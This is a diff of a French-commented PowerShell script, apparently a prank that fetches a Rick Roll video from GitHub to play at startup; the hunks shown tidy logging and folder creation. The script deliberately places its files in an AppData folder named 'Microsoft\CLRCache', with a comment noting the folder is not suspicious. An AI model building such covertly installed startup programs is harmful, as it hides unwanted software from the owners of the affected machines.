@@ -4,7 +4,7 @@ $DEBUG = $true  # Mettre $false pour désactiver les logs
 $AppData = $env:APPDATA
 $LocalPath = Join-Path $AppData "Microsoft\CLRCache"    # dossier pas suspect
 
-# Modification ici : gérer le cas où $MyInvocation.MyCommand.Path est nul
+# Gestion du dossier de script
 if ($MyInvocation.MyCommand.Path) {
     $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 } else {
@@ -12,27 +12,24 @@ if ($MyInvocation.MyCommand.Path) {
     $ScriptDir = $LocalPath
 }
 
-$VideoURL = "https://github.com/delete-user-56/RickRoll_OnStartup/raw/main/RickRoll.mp4"
-$LogFile = Join-Path $ScriptDir "install.log"
-# ===========================================
+# Crée le dossier de logs (script dir) s'il n'existe pas
 if (-not (Test-Path $ScriptDir)) {
     New-Item -ItemType Directory -Path $ScriptDir -Force | Out-Null
 }
 
-function Log {
-    param ($msg)
-    if ($DEBUG) {
-        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        Add-Content -Path $LogFile -Value "[$timestamp] $msg"
-    }
-}
-
+$VideoURL = "https://github.com/delete-user-56/RickRoll_OnStartup/raw/main/RickRoll.mp4"
+$LogFile = Join-Path $ScriptDir "install.log"
+# ===========================================
 
 function Log {
     param ($msg)
     if ($DEBUG) {
         $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        Add-Content -Path $LogFile -Value "[$timestamp] $msg"
+        try {
+            Add-Content -Path $LogFile -Value "[$timestamp] $msg"
+        } catch {
+            Write-Host "Erreur écriture log : $_"
+        }
     }
 }
 
@@ -41,7 +38,7 @@ try {
 
     # Créer dossier local dans AppData si pas existant
     if (-not (Test-Path $LocalPath)) {
-        New-Item -ItemType Directory -Path $LocalPath | Out-Null
+        New-Item -ItemType Directory -Path $LocalPath -Force | Out-Null
         Log "Created local folder at $LocalPath"
     }
 
